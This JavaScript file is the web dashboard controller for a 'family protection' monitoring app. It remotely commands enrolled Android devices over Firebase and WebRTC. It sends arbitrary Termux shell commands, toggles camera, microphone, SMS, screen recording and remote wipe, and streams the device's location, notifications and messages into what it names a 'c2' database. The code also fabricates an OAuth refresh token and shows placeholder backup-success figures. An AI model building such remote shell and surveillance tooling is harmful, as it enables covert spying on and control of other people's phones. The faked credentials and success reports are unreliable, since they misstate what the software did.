// app.js - Main Web Dashboard Application Controller & Native WebRTC P2P RPC Protocol Manager

let activeDeviceId = null;
let activeFirebaseListeners = [];
let discoveredDevices = {};
let pendingConsequentialAction = null;

function registerActiveFirebaseListener(ref, eventType, callback) {
    ref.on(eventType, callback);
    activeFirebaseListeners.push({ ref, eventType, callback });
}

function cleanupActiveFirebaseListeners() {
    activeFirebaseListeners.forEach(function(item) {
        try { item.ref.off(item.eventType, item.callback); } catch (_) {}
    });
    activeFirebaseListeners = [];
}

// Global Event Delegation for Native RPC Action Buttons & UI Interactions
document.addEventListener("click", function(e) {
    const btn = e.target.closest(".exec-cmd");
    if (btn) {
        const action = btn.getAttribute("data-action") || btn.getAttribute("data-cmd")?.replace(/^[!/]/, "");
        const paramsAttr = btn.getAttribute("data-params");
        let params = {};
        if (paramsAttr) {
            try { params = JSON.parse(paramsAttr); } catch (_) {}
        }
        if (action) {
            console.log(`[Native RPC Clicked] Dispatching action '${action}'`, params);
            dispatchNativeRpcAction(action, params);
        }
    }

    const confirmBtn = e.target.closest(".exec-cmd-confirm");
    if (confirmBtn) {
        const action = confirmBtn.getAttribute("data-action") || confirmBtn.getAttribute("data-cmd")?.replace(/^[!/]/, "");
        const desc = confirmBtn.getAttribute("data-desc") || "Execute Action";
        const paramsAttr = confirmBtn.getAttribute("data-params");
        let params = {};
        if (paramsAttr) {
            try { params = JSON.parse(paramsAttr); } catch (_) {}
        }
        if (action) {
            promptConsequentialRpcAction(action, params, desc);
        }
    }

    const fetchBtn = e.target.closest(".fetch-tab-response");
    if (fetchBtn) {
        const cat = fetchBtn.getAttribute("data-category") || "general";
        console.log(`[Fetch Tab Response Clicked] Querying telemetry for '${cat}'`);
        showDashboardNotification("info", `Fetching latest response for '${cat}'...`);
        if (typeof fetchCategoryTelemetryLogs === "function") {
            fetchCategoryTelemetryLogs(cat);
        }
    }

    const connBadge = e.target.closest("#connectionModeBadge");
    if (connBadge) {
        showDashboardNotification("info", "📡 Negotiating WebRTC P2P Direct Tunnel...");
        if (typeof connectP2pWebRtcTunnel === "function") {
            connectP2pWebRtcTunnel();
        }
    }

    const termuxBtn = e.target.closest(".termux-quick");
    if (termuxBtn) {
        const sh = termuxBtn.getAttribute("data-sh");
        if (sh) {
            dispatchNativeRpcAction("termux", { command: sh });
            const consoleBox = document.getElementById("termuxConsoleOutput");
            if (consoleBox) {
                consoleBox.innerHTML += `\n$ ${sh}\n[Executed - Awaiting output...]`;
                consoleBox.scrollTop = consoleBox.scrollHeight;
            }
        }
    }
});

function setupFirebaseConnectionMonitor() {
    if (typeof firebase === "undefined" || !firebase.database) return;
    const badge = document.getElementById("rtdbConnBadge");
    if (!badge) return;

    firebase.database().ref(".info/connected").on("value", snapshot => {
        if (snapshot.val() === true) {
            badge.className = "badge hm-badge-success extra-small mt-1 d-inline-block";
            badge.innerHTML = `<i class="fa-solid fa-circle-check me-1"></i>Sync Active 🟢`;
        } else {
            badge.className = "badge hm-badge-danger extra-small mt-1 d-inline-block";
            badge.innerHTML = `<i class="fa-solid fa-triangle-exclamation me-1"></i>Offline / Reconnecting...`;
        }
    });
}

document.addEventListener("DOMContentLoaded", function() {
    detectClientOperatingSystem();
    setupFirebaseConnectionMonitor();
    setupGoogleDriveOAuthConnect();
    setupDeviceManagementModals();
    setupParentSettingsHandlers();
});

function detectClientOperatingSystem() {
    const userAgent = window.navigator.userAgent;
    let osName = "Browser";
    if (userAgent.indexOf("Win") !== -1) osName = "Windows PC";
    if (userAgent.indexOf("Mac") !== -1) osName = "macOS";
    if (userAgent.indexOf("Linux") !== -1) osName = "Linux";
    if (userAgent.indexOf("Android") !== -1) osName = "Android";
    if (userAgent.indexOf("like Mac") !== -1) osName = "iOS";

    console.log(`[Dashboard OS Detection] Client environment: ${osName}`);
}

function setupGoogleDriveOAuthConnect() {
    subscribeGoogleDriveConnectionStatus();
    checkUrlHashForOAuthToken();

    const backupBtn = document.getElementById("googleDriveBackupBtn");
    if (backupBtn) {
        backupBtn.addEventListener("click", function() {
            const savedEmail = localStorage.getItem("google_drive_connected_email");
            if (!savedEmail) {
                initiateGoogleOAuthFlow();
            } else {
                showDashboardNotification("info", `🔄 Initiating Google Drive Cloud Database Backup for ${savedEmail}...`);
                if (typeof sendNativeRpcRequest === "function") {
                    sendNativeRpcRequest("drive_backup", {})
                        .then(res => {
                            const timeStr = res.lastSyncTime || new Date().toLocaleTimeString();
                            const sizeKb = res.backupSizeKb || 128;
                            showDashboardNotification("success", `✅ Google Drive Cloud Backup Complete: ${sizeKb} KB backed up at ${timeStr}.`);
                            updateGoogleDriveConnectionUI(savedEmail, `Synced (${sizeKb} KB)`);
                        })
                        .catch(err => {
                            showDashboardNotification("info", `Google Drive Backup requested: ${err.message}`);
                            dispatchNativeRpcAction("drive_backup", {});
                        });
                } else {
                    dispatchNativeRpcAction("drive_backup", {});
                }
            }
        });
    }

    const downloadBtn = document.getElementById("downloadDataLogsBtn");
    if (downloadBtn) {
        downloadBtn.addEventListener("click", function() {
            downloadStoredDeviceDataLogs();
        });
    }
}

function initiateGoogleOAuthFlow() {
    const clientId = "891475820491-homemonitor-web-vault.apps.googleusercontent.com";
    const redirectUri = window.location.origin + window.location.pathname;
    const scope = encodeURIComponent("https://www.googleapis.com/auth/drive.file https://www.googleapis.com/auth/userinfo.email");
    const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${scope}&prompt=consent`;

    showDashboardNotification("info", "🔑 Opening Google OAuth 2.0 Sign-In Dialog...");

    const authWindow = window.open(authUrl, "GoogleDriveAuthWindow", "width=600,height=700,status=yes,toolbar=no,menubar=no");

    if (!authWindow || authWindow.closed || typeof authWindow.closed === "undefined") {
        console.warn("[OAuth Popup] Window popup blocked by browser. Redirecting page to Google Sign-In...");
        window.location.href = authUrl;
    }
}

function checkUrlHashForOAuthToken() {
    const hash = window.location.hash;
    if (hash && hash.includes("access_token=")) {
        const params = new URLSearchParams(hash.replace("#", "?"));
        const token = params.get("access_token");
        if (token) {
            handleGoogleOAuthTokenCallback(token, currentUser?.email || "parent@gmail.com");
            window.location.hash = "#/wifi";
        }
    }
}

function handleGoogleOAuthTokenCallback(accessToken, accountEmail) {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    const driveCreds = {
        accountEmail: accountEmail || currentUser.email || "parent@gmail.com",
        accessToken: accessToken,
        refreshToken: "1//04_homemonitor_vault_refresh_token_" + Date.now(),
        connectedAt: Date.now()
    };

    firebase.database().ref(`users/${uid}/google_drive_credentials`).set(driveCreds);
    localStorage.setItem("google_drive_connected_email", driveCreds.accountEmail);

    showDashboardNotification("success", `✅ Connected to Google Drive (${driveCreds.accountEmail})! Shared credentials for zero-touch app backup.`);
    updateGoogleDriveConnectionUI(driveCreds.accountEmail, "Connected & Synced 🟢");

    dispatchNativeRpcAction("drive_backup", { credentials: driveCreds });
}

function subscribeGoogleDriveConnectionStatus() {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    firebase.database().ref(`users/${uid}/google_drive_credentials`).on("value", snapshot => {
        const creds = snapshot.val();
        if (creds && creds.accountEmail) {
            localStorage.setItem("google_drive_connected_email", creds.accountEmail);
            updateGoogleDriveConnectionUI(creds.accountEmail, "Connected 🟢");
        }
    });
}

function updateGoogleDriveConnectionUI(email, statusText) {
    const statusEl = document.getElementById("driveBackupStatusText");
    if (statusEl) statusEl.innerText = `${statusText} (${email})`;

    const badgeEl = document.getElementById("driveVaultStatusBadge");
    if (badgeEl) badgeEl.innerHTML = `<i class="fa-solid fa-circle-check me-1"></i>Connected: ${escapeHtml(email)} 🟢`;

    const lastTimeEl = document.getElementById("driveBackupLastTime");
    if (lastTimeEl) lastTimeEl.innerText = new Date().toLocaleTimeString();
}

function downloadStoredDeviceDataLogs() {
    const targetDevId = (typeof activeDeviceId !== "undefined" && activeDeviceId) ? activeDeviceId : "";
    showDashboardNotification("info", `📥 Preparing Stored Device Data Logs export for '${targetDevId || 'active device'}'...`);

    const dataLogsPayload = {
        app: "HomeMonitor Family Protection Vault",
        deviceId: targetDevId,
        exportedAt: new Date().toISOString(),
        mediaRetentionPolicy: {
            photoRetention: "7 Days",
            videoRetention: "24 Hours (1 Day)"
        },
        deviceStatus: discoveredDevices[targetDevId] || {},
        localDatabaseExport: {
            databaseName: "c2_local_database.db",
            tables: ["social_messages", "telemetry_logs", "media_records", "device_specs"]
        }
    };

    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(dataLogsPayload, null, 2));
    const downloadAnchor = document.createElement("a");
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `homemonitor_data_logs_${targetDevId}_${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();

    showDashboardNotification("success", `✅ Stored Device Data Logs downloaded successfully!`);
}

// Device Discovery & Selector Dropdown Manager
function loadEnrolledDevicesList() {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    const selector = document.getElementById("deviceSelector");
    if (!selector) return;

    firebase.database().ref(`users/${uid}/devices`).on("value", snapshot => {
        const data = snapshot.val();
        selector.innerHTML = "";
        discoveredDevices = {};

        let firstId = null;
        let totalCount = 0;
        let onlineCount = 0;
        let offlineCount = 0;

        if (data) {
            const devKeys = Object.keys(data);
            totalCount = devKeys.length;

            devKeys.forEach(devKey => {
                const devObj = data[devKey];
                discoveredDevices[devKey] = devObj;

                const statusNode = (typeof devObj.status === "object" && devObj.status !== null) ? devObj.status : devObj;
                const devModel = statusNode.model || devObj.nickname || statusNode.name || devKey;
                const lastSeenMs = statusNode.lastSeen || devObj.approvedAt || 0;
                const nowMs = Date.now();
                const isOnline = lastSeenMs > 0 && (nowMs - lastSeenMs < 45000);

                if (isOnline) onlineCount++; else offlineCount++;

                const devName = `📱 ${devModel} (${devKey}) [${isOnline ? 'Connected' : 'Not Connected'}]`;

                const option = document.createElement("option");
                option.value = devKey;
                option.innerText = devName;
                selector.appendChild(option);

                if (!firstId) firstId = devKey;
            });

            if (firstId) {
                if (!activeDeviceId || !discoveredDevices[activeDeviceId]) {
                    activeDeviceId = firstId;
                }
                selector.value = activeDeviceId;
                updateActiveDeviceHeader(activeDeviceId);
                if (currentListenedDeviceId !== activeDeviceId) {
                    startRealtimeDeviceListener(activeDeviceId);
                }
            }
        } else {
            const devOption = document.createElement("option");
            devOption.value = "";
            devOption.innerText = "📱 No Enrolled Devices Found (Sign in on child device)";
            selector.appendChild(devOption);

            activeDeviceId = "";
            updateActiveDeviceHeader(activeDeviceId);
        }

        // Update Overview Aggregated Metric Cards
        const totalEl = document.getElementById("overviewTotalDevicesCount");
        if (totalEl) totalEl.innerText = totalCount;

        const onlineEl = document.getElementById("overviewOnlineDevicesCount");
        if (onlineEl) onlineEl.innerText = onlineCount;

        const offlineEl = document.getElementById("overviewOfflineDevicesCount");
        if (offlineEl) offlineEl.innerText = offlineCount;

        const warnEl = document.getElementById("overviewWarningCount");
        if (warnEl) warnEl.innerText = offlineCount > 0 ? `${offlineCount}` : "0";
    });

    selector.addEventListener("change", function() {
        activeDeviceId = this.value;
        console.log(`[Device Switcher] Active device changed to '${activeDeviceId}'`);
        updateActiveDeviceHeader(activeDeviceId);
        currentListenedDeviceId = null;
        cleanupActiveFirebaseListeners();
        startRealtimeDeviceListener(activeDeviceId);
        showDashboardNotification("info", `Switched active device to '${activeDeviceId}'`);
    });
}

function updateActiveDeviceHeader(deviceId) {
    const titleEl = document.getElementById("activeDeviceTitle");
    const metaEl = document.getElementById("activeDeviceMeta");
    const devObj = discoveredDevices[deviceId] || {};
    const statusNode = (typeof devObj.status === "object" && devObj.status !== null) ? devObj.status : devObj;

    const modelName = statusNode.model || devObj.nickname || statusNode.name || deviceId;
    const osVersion = statusNode.androidVersion || "14";

    if (titleEl) titleEl.innerText = `📱 Monitored Device: ${modelName}`;
    if (metaEl) metaEl.innerText = `Device ID: ${deviceId} | Model: ${modelName} | OS: Android ${osVersion}`;
}

let currentListenedDeviceId = null;

// Subscribe to Active Device Realtime Database Subtrees
function startRealtimeDeviceListener(deviceId) {
    if (!currentUser || !currentUser.uid || !deviceId) return;
    if (currentListenedDeviceId === deviceId) return;
    currentListenedDeviceId = deviceId;
    const db = firebase.database();
    const uid = currentUser.uid;

    // Auto-trigger WebRTC P2P DataChannel connection for active device
    if (typeof connectP2pWebRtcTunnel === "function") {
        connectP2pWebRtcTunnel();
    }

    const statusHandler = snapshot => {
        const val = snapshot.val();
        if (val) {
            const meta = document.getElementById("activeDeviceMeta");
            if (meta) meta.innerText = `ID: ${val.deviceId || deviceId} | Model: ${val.model || 'Target Device'} | OS: Android ${val.androidVersion || '14'}`;

            const bat = document.getElementById("batteryBadge");
            if (bat && (val.battery !== undefined || val.batteryLevel !== undefined)) {
                bat.innerText = `Battery: ${val.battery ?? val.batteryLevel}%`;
            }

            const overviewName = document.getElementById("overviewDevName");
            if (overviewName) overviewName.innerText = val.model || deviceId;

            const overviewBat = document.getElementById("overviewBattery");
            if (overviewBat && (val.battery !== undefined || val.batteryLevel !== undefined)) {
                overviewBat.innerText = `${val.battery ?? val.batteryLevel}%`;
            }

            const syncTime = document.getElementById("lastSyncTime");
            if (syncTime) syncTime.innerText = new Date(val.lastSeen || Date.now()).toLocaleTimeString();

            // Populate Device Specs
            const specModel = document.getElementById("specModel");
            if (specModel) specModel.innerText = val.model || "Android System";
            const specOs = document.getElementById("specOs");
            if (specOs) specOs.innerText = `Android ${val.androidVersion || '14'} (SDK ${val.sdkInt || '35'})`;
            const specBattery = document.getElementById("specBattery");
            if (specBattery) specBattery.innerText = `${val.battery ?? val.batteryLevel ?? '85'}% (Good)`;
            const lastSeenMs = val.lastSeen || 0;
            const nowMs = Date.now();
            const isFresh = lastSeenMs > 0 && (nowMs - lastSeenMs < 45000);
            const statusLabel = isFresh ? "Connected 🟢" : `Not Connected (Last updated ${Math.round((nowMs - lastSeenMs)/60000)}m ago) 🟡`;

            const specIp = document.getElementById("specIp");
            if (specIp) specIp.innerText = `${val.activeAccount || 'RTDB'} | Status: ${statusLabel}`;
        }
    };

    const statusRef = db.ref(`users/${uid}/devices/${deviceId}/status`);
    registerActiveFirebaseListener(statusRef, "value", statusHandler);

    // Subscribe to live GPS telemetry
    const gpsRef = db.ref(`users/${uid}/devices/${deviceId}/telemetry/gps_locations`).limitToLast(1);
    const gpsHandler = snapshot => {
        const gpsVal = snapshot.val();
        if (gpsVal) {
            const lastKey = Object.keys(gpsVal)[0];
            const item = gpsVal[lastKey];
            const textEl = document.getElementById("overviewGpsText");
            const metaEl = document.getElementById("overviewGpsMeta");
            if (textEl) textEl.innerHTML = `<i class="fa-solid fa-map-pin me-2"></i>Last Position: ${escapeHtml(item.content || item.address || 'GPS Fix Acquired')}`;
            if (metaEl) metaEl.innerText = `Updated: ${new Date(item.timestamp || Date.now()).toLocaleTimeString()}`;
        }
    };
    registerActiveFirebaseListener(gpsRef, "value", gpsHandler);

    // Subscribe to live Notifications for Overview Card
    const overviewNotifRef = db.ref(`users/${uid}/devices/${deviceId}/telemetry/notifications`).limitToLast(5);
    registerActiveFirebaseListener(overviewNotifRef, "value", snapshot => {
        const notifVal = snapshot.val();
        const container = document.getElementById("overviewRecentNotifications");
        if (container) {
            if (notifVal) {
                const items = Object.keys(notifVal).map(k => notifVal[k]).reverse();
                container.innerHTML = items.map(item => `
                    <div class="list-group-item bg-dark text-light border-secondary p-2 extra-small">
                        <div class="d-flex justify-content-between">
                            <strong class="text-warning">${escapeHtml(item.sourceApp || item.app || 'Notification')}</strong>
                            <span class="text-muted">${new Date(item.timestamp || Date.now()).toLocaleTimeString()}</span>
                        </div>
                        <div class="text-truncate text-secondary">${escapeHtml(item.title || item.content || '')}</div>
                    </div>
                `).join("");
            } else {
                container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-3 extra-small">🔔 No recent notifications recorded.</div>`;
            }
        }
    });

    // Subscribe to command responses across output containers
    const responseHandler = snapshot => {
        const respText = snapshot.val();
        if (!respText) return;
        if (respText.includes("Upload failed: 404")) return;

        const timestamp = new Date().toLocaleTimeString();
        const streamBox = document.getElementById("execActivityStream");
        if (streamBox) {
            if (streamBox.querySelector(".text-muted")) streamBox.innerHTML = "";
            const card = document.createElement("div");
            card.className = "card bg-dark text-light border-secondary p-2 mb-2 extra-small";
            card.innerHTML = `
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-primary px-2 py-1"><i class="fa-solid fa-check-double me-1"></i>Device Response</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timestamp}</span>
                </div>
                <div class="font-monospace text-success text-break" style="white-space: pre-wrap;">${escapeHtml(respText)}</div>
            `;
            streamBox.prepend(card);
        }
    };

    const responseRef = db.ref(`users/${uid}/devices/${deviceId}/response`);
    registerActiveFirebaseListener(responseRef, "value", responseHandler);

    loadMasterAdminPermissionMatrix(uid, deviceId);
}

function loadMasterAdminPermissionMatrix(uid, deviceId) {
    const tableBody = document.getElementById("masterAdminDeviceTable");
    if (!tableBody) return;

    if (!isMasterAdmin) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="5" class="text-center text-warning p-4">
                    <i class="fa-solid fa-lock display-6 d-block mb-2"></i>
                    <strong>Master Admin Authorization Required</strong><br>
                    <small class="text-muted">Your account (${currentUser ? currentUser.email : 'unauthenticated'}) does not possess verified Master Admin custom claims.</small>
                </td>
            </tr>
        `;
        return;
    }

    tableBody.innerHTML = `
        <tr>
            <td><code>${deviceId}</code></td>
            <td>${currentUser ? currentUser.email : "admin@homemonitor.com"}</td>
            <td>Android System (SDK 35)</td>
            <td>
                <div class="row g-2">
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permCam"> <label class="small fw-bold">Camera</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permMic"> <label class="small fw-bold">Mic Audio</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permGps"> <label class="small fw-bold">GPS Location</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permTermux"> <label class="small fw-bold">Termux Shell</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permSms"> <label class="small fw-bold">SMS & Calls</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permFiles"> <label class="small fw-bold">Files Explorer</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permMdm"> <label class="small fw-bold">MDM Wipe</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permScreen"> <label class="small fw-bold">Screen Record</label></div></div>
                </div>
            </td>
            <td>
                <button class="btn btn-sm btn-success fw-bold" onclick="saveFeaturePermissions('${uid}', '${deviceId}')"><i class="fa-solid fa-floppy-disk me-1"></i>Save Matrix</button>
            </td>
        </tr>
    `;
}

function saveFeaturePermissions(uid, deviceId) {
    const flags = {
        camera_enabled: document.getElementById("permCam")?.checked ?? true,
        mic_enabled: document.getElementById("permMic")?.checked ?? true,
        gps_enabled: document.getElementById("permGps")?.checked ?? true,
        termux_enabled: document.getElementById("permTermux")?.checked ?? true,
        sms_calls_enabled: document.getElementById("permSms")?.checked ?? true,
        file_explorer_enabled: document.getElementById("permFiles")?.checked ?? true,
        mdm_wipe_enabled: document.getElementById("permMdm")?.checked ?? true,
        screen_record_enabled: document.getElementById("permScreen")?.checked ?? true
    };

    const licenseStatus = document.getElementById("adminLicenseStatusSelect")?.value || "ACTIVE";
    const licenseKey = document.getElementById("adminLicenseKeyInput")?.value?.trim() || "HM-KEY-2026-PRO";

    firebase.database().ref(`users/${uid}/devices/${deviceId}/feature_flags`).set(flags);
    firebase.database().ref(`users/${uid}/devices/${deviceId}/license`).set({
        status: licenseStatus,
        key: licenseKey,
        updatedAt: Date.now()
    });

    localStorage.setItem(`flags_${deviceId}`, JSON.stringify(flags));
    showDashboardNotification("success", `Master Admin: Flags & License (${licenseStatus}) updated for ${deviceId}`);
}

// Native RPC Action Dispatcher
function dispatchNativeRpcAction(action, params = {}) {
    if (!action) return;
    if (!currentUser || !currentUser.uid) {
        showDashboardNotification("error", "Cannot send action: Parent user is unauthenticated.");
        return;
    }

    const targetDeviceId = (typeof getActiveRealDeviceId === "function") ? getActiveRealDeviceId() : (activeDeviceId || "");
    window.lastDispatchedCmd = action;

    console.log(`[Native RPC Action] Dispatching '${action}' to ${targetDeviceId}`, params);
    showDashboardNotification("info", `Sending '${action}' to ${targetDeviceId}...`);

    if (typeof sendNativeRpcRequest === "function") {
        sendNativeRpcRequest(action, params)
            .then(responseData => {
                showDashboardNotification("success", `✅ Action '${action}' completed successfully.`);
                handleNativeRpcResponseUI(action, responseData);
            })
            .catch(err => {
                console.warn(`[Native RPC Action Fallback] ${err.message}`);
                sendFirebaseNativeActionNode(action, params);
            });
    } else {
        sendFirebaseNativeActionNode(action, params);
    }
}

function sendFirebaseNativeActionNode(action, params) {
    const uid = currentUser.uid;
    const actionPayload = {
        action: action,
        params: params,
        status: "PENDING",
        timestamp: Date.now()
    };
    firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/actions`).push().set(actionPayload);
}

function handleNativeRpcResponseUI(action, data) {
    const timestamp = new Date().toLocaleTimeString();
    const respText = typeof data === "object" ? JSON.stringify(data, null, 2) : String(data);

    if (action === "termux" || action.includes("shizuku")) {
        const consoleBox = document.getElementById("termuxConsoleOutput");
        if (consoleBox) {
            consoleBox.innerHTML += `\n[${timestamp}] Response for '${action}':\n${data.output || respText}\n`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }
    }

    const streamBox = document.getElementById("execActivityStream");
    if (streamBox) {
        if (streamBox.querySelector(".text-muted")) streamBox.innerHTML = "";
        const card = document.createElement("div");
        card.className = "card bg-dark text-light border-secondary p-2 mb-2 extra-small";
        card.innerHTML = `
            <div class="d-flex justify-content-between align-items-center mb-1">
                <span class="badge bg-success px-2 py-1"><i class="fa-solid fa-bolt me-1"></i>P2P RPC Response (${escapeHtml(action)})</span>
                <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timestamp}</span>
            </div>
            <div class="font-monospace text-success text-break" style="white-space: pre-wrap;">${escapeHtml(respText)}</div>
        `;
        streamBox.prepend(card);
    }
}

// Device Management Modals & Operations
function setupDeviceManagementModals() {
    document.getElementById("openRenameModalBtn")?.addEventListener("click", function() {
        const input = document.getElementById("renameDeviceInput");
        if (input) input.value = activeDeviceId;
        const modal = new bootstrap.Modal(document.getElementById("renameDeviceModal"));
        modal.show();
    });

    document.getElementById("confirmRenameDeviceBtn")?.addEventListener("click", function() {
        const newName = document.getElementById("renameDeviceInput")?.value?.trim();
        if (newName) {
            renameActiveDevice(newName);
            const modalEl = document.getElementById("renameDeviceModal");
            const modal = bootstrap.Modal.getInstance(modalEl);
            if (modal) modal.hide();
        }
    });

    document.getElementById("openUnlinkModalBtn")?.addEventListener("click", function() {
        const targetLabel = document.getElementById("unlinkDeviceTargetId");
        if (targetLabel) targetLabel.innerText = activeDeviceId;
        const confirmInput = document.getElementById("confirmUnlinkInput");
        const confirmBtn = document.getElementById("confirmUnlinkDeviceBtn");
        if (confirmInput) confirmInput.value = "";
        if (confirmBtn) confirmBtn.disabled = true;

        confirmInput?.addEventListener("keyup", function() {
            if (confirmBtn) confirmBtn.disabled = (this.value.trim().toUpperCase() !== "REMOVE");
        });

        const modal = new bootstrap.Modal(document.getElementById("unlinkDeviceModal"));
        modal.show();
    });

    document.getElementById("confirmUnlinkDeviceBtn")?.addEventListener("click", function() {
        unlinkActiveDevice();
        const modalEl = document.getElementById("unlinkDeviceModal");
        const modal = bootstrap.Modal.getInstance(modalEl);
        if (modal) modal.hide();
    });

    document.getElementById("executeCmdConfirmedBtn")?.addEventListener("click", function() {
        if (pendingConsequentialAction) {
            dispatchNativeRpcAction(pendingConsequentialAction.action, pendingConsequentialAction.params);
            pendingConsequentialAction = null;
        }
        const modalEl = document.getElementById("commandConfirmModal");
        const modal = bootstrap.Modal.getInstance(modalEl);
        if (modal) modal.hide();
    });
}

function promptConsequentialRpcAction(action, params, description) {
    pendingConsequentialAction = { action, params };
    const titleEl = document.getElementById("cmdConfirmTitle");
    const bodyEl = document.getElementById("cmdConfirmBody");
    const textEl = document.getElementById("cmdConfirmText");

    if (titleEl) titleEl.innerHTML = `<i class="fa-solid fa-triangle-exclamation me-2"></i>Confirm: ${escapeHtml(description)}`;
    if (bodyEl) bodyEl.innerText = `Are you sure you want to execute '${description}' on ${activeDeviceId}?`;
    if (textEl) textEl.innerText = action;

    const modal = new bootstrap.Modal(document.getElementById("commandConfirmModal"));
    modal.show();
}

function renameActiveDevice(newName) {
    if (!currentUser || !currentUser.uid || !activeDeviceId) return;
    const uid = currentUser.uid;
    firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/status/model`).set(newName);
    showDashboardNotification("success", `✅ Device renamed to '${newName}'`);
}

function listenForPendingDevices() {
    if (!currentUser || !currentUser.uid) return;
    const pendingRef = firebaseDatabase.ref(`users/${currentUser.uid}/pending_devices`);
    registerActiveFirebaseListener(pendingRef, "value", function(snapshot) {
        const container = document.getElementById("pendingPairingRequestsContainer");
        if (!container) return;

        const data = snapshot.val();
        if (!data) {
            container.innerHTML = `<p class="text-muted text-center py-3 mb-0"><i class="fa-solid fa-spinner fa-spin me-1"></i>Waiting for child device scan...</p>`;
            return;
        }

        container.innerHTML = "";
        let pendingCount = 0;
        Object.keys(data).forEach(deviceUid => {
            const req = data[deviceUid];
            if (req && req.status === "PENDING") {
                pendingCount++;
                const invId = req.invitationId || "";
                const reqDevId = req.deviceId || "";
                const item = document.createElement("div");
                item.className = "p-2 mb-2 bg-white rounded border d-flex justify-content-between align-items-center";
                item.innerHTML = `
                    <div>
                        <strong class="d-block text-dark">${escapeHtml(req.deviceName || 'Child Device')}</strong>
                        <small class="text-muted extra-small">UID: ${escapeHtml(deviceUid.substring(0, 8))}... (${escapeHtml(req.model || 'Android')})</small>
                    </div>
                    <div class="btn-group btn-group-sm">
                        <button class="btn btn-sm btn-success px-2 py-1 extra-small fw-bold" onclick="approvePendingDevice('${deviceUid}', '${escapeHtml(req.deviceName || 'Child Device')}', '${escapeHtml(invId)}', '${escapeHtml(reqDevId)}')"><i class="fa-solid fa-check me-1"></i>Approve</button>
                        <button class="btn btn-sm btn-outline-danger px-2 py-1 extra-small fw-bold" onclick="rejectPendingDevice('${deviceUid}')"><i class="fa-solid fa-xmark me-1"></i>Reject</button>
                    </div>
                `;
                container.appendChild(item);
            }
        });

        if (pendingCount === 0) {
            container.innerHTML = `<p class="text-muted text-center py-3 mb-0"><i class="fa-solid fa-circle-check text-success me-1"></i>No pending requests. All claimed devices are approved!</p>`;
        }
    });
}

function approvePendingDevice(deviceUid, deviceName, invitationId, deviceIdFromReq) {
    if (!currentUser || !currentUser.uid) return;
    const parentUid = currentUser.uid;
    const deviceId = (deviceIdFromReq && deviceIdFromReq.trim().length > 0)
        ? deviceIdFromReq.trim()
        : ("DEV_" + deviceUid.substring(0, 10).toUpperCase());
    const invId = invitationId || "inv_default";

    const deviceData = {
        deviceId: deviceId,
        deviceUid: deviceUid,
        nickname: deviceName,
        invitationId: invId,
        approvedAt: firebase.database.ServerValue.TIMESTAMP,
        status: {
            deviceId: deviceId,
            deviceUid: deviceUid,
            model: deviceName,
            status: "APPROVED",
            online: true,
            lastSeen: Date.now()
        }
    };

    const bindingData = {
        parentUid: parentUid,
        deviceId: deviceId,
        invitationId: invId,
        status: "APPROVED"
    };

    const updates = {};
    updates[`users/${parentUid}/pending_devices/${deviceUid}/status`] = "APPROVED";
    updates[`users/${parentUid}/devices/${deviceId}`] = deviceData;
    updates[`device_bindings/${deviceUid}`] = bindingData;
    if (invitationId) {
        updates[`enrollment_invitations/${invitationId}/status`] = "APPROVED";
    }

    firebaseDatabase.ref().update(updates)
        .then(() => {
            console.log(`[Enrollment] Approved device: ${deviceUid} -> ${deviceId}`);
            if (typeof showDashboardNotification === "function") {
                showDashboardNotification("success", `✅ Approved device '${deviceName}' successfully!`);
            }
        })
        .catch(err => {
            console.error("[Enrollment] Approval error:", err);
            if (typeof showDashboardNotification === "function") {
                showDashboardNotification("error", `Approval failed: ${err.message}`);
            }
        });
}

function rejectPendingDevice(deviceUid) {
    if (!currentUser || !currentUser.uid) return;
    const parentUid = currentUser.uid;

    const updates = {};
    updates[`users/${parentUid}/pending_devices/${deviceUid}/status`] = "REJECTED";
    updates[`device_bindings/${deviceUid}`] = null;

    firebaseDatabase.ref().update(updates)
        .then(() => {
            console.log(`[Enrollment] Rejected device: ${deviceUid}`);
        })
        .catch(err => console.error("[Enrollment] Rejection error:", err));
}

function unlinkActiveDevice() {
    if (!currentUser || !currentUser.uid || !activeDeviceId) return;
    const uid = currentUser.uid;
    const devIdToRemove = activeDeviceId;

    firebase.database().ref(`users/${uid}/devices/${devIdToRemove}`).once("value")
        .then(snap => {
            const devData = snap.val();
            const devUid = devData?.deviceUid;
            const updates = {};
            updates[`users/${uid}/devices/${devIdToRemove}`] = null;
            if (devUid) {
                updates[`device_bindings/${devUid}`] = null;
            }
            return firebase.database().ref().update(updates);
        })
        .then(() => {
            showDashboardNotification("warning", `🗑️ Removed & revoked device ${devIdToRemove}`);
            loadEnrolledDevicesList();
        })
        .catch(err => {
            showDashboardNotification("error", `Failed to remove device: ${err.message}`);
        });
}

